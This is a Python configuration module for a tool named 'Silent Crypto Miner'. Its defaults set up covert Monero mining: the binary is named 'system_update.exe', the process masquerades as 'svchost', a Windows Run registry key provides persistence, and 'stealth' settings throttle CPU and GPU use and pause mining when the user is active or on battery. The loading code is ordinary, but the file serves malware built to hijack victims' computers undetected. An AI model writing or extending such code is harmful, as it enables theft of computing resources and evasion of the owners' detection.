# -*- coding: utf-8 -*-
"""
Configuration loader for Silent Crypto Miner — JSON config + defaults.
"""
import json
import os

CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")

DEFAULT_CONFIG = {
    "build": {
        "target_os": "windows",
        "target_arch": "x64",
        "output_name": "system_update.exe",
        "custom_icon": "",
        "process_name": "svchost",
        "auto_start": False,
        "registry_key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    },
    "algorithm": {
        "name": "randomx",
        "threads": 0,
        "intensity": 80,
        "gpu_enabled": True,
    },
    "pool": {
        "url": "stratum+ssl://xmr.nanopool.org:14433",
        "wallet": "",
        "worker": "rig-01",
        "password": "",
        "failover": [],
    },
    "stealth": {
        "cpu_limit_pct": 70,
        "gpu_limit_pct": 60,
        "pause_on_activity": True,
        "activity_threshold": 30,
        "pause_on_battery": True,
        "schedule_enabled": False,
        "active_hours": "00:00-08:00",
        "timezone": "UTC",
    },
}


def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            user_cfg = json.load(f)
        merged = {**DEFAULT_CONFIG, **user_cfg}
        return merged
    return DEFAULT_CONFIG.copy()


def save_config(cfg):
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=4, ensure_ascii=False)


def get_config_value(key, default=None):
    cfg = load_config()
    keys = key.split(".")
    val = cfg
    for k in keys:
        if isinstance(val, dict) and k in val:
            val = val[k]
        else:
            return default
    return val
